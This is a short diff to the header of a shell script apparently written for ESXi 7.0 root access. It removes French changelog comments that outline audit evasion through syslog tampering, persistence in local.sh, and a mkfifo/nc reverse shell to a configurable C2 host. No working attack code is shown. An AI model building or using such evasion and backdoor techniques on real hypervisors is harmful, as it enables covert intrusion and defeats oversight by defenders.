@@ -1,16 +1,6 @@
 #!/bin/sh
-# HARNESS-VALIDATION v2.4.0 — ESXi 7.0 root. Évasion d'audit + persistance.
-# Corrige audit §3.6 + revue J4 + revue v2.2 :
-#   - Restauration différée (pas immédiate)
-#   - Persistance dans local.sh EXISTANT (pas .new)
-#   - Reverse shell BusyBox compatible (mkfifo)
-#   - Idempotence
-#   - Un seul syslog reload
-#   - v2.3 : C2_HOST/C2_PORT configurables via env vars
-#   - v2.3 : script de restauration en chemin persistant (pas /tmp/)
-#   - v2.4 : vérification qu'esxcli est dans le PATH
-#   - v2.4 : création explicite de $PERSIST si inexistant
-#   - v2.4 : quotation de $C2_HOST/$C2_PORT dans la commande nc
+# HARNESS-VALIDATION — ESXi 7.0 root. Évasion d'audit + persistance.
+
 set -e
 
 CONFIG=/etc/vmsyslog.conf
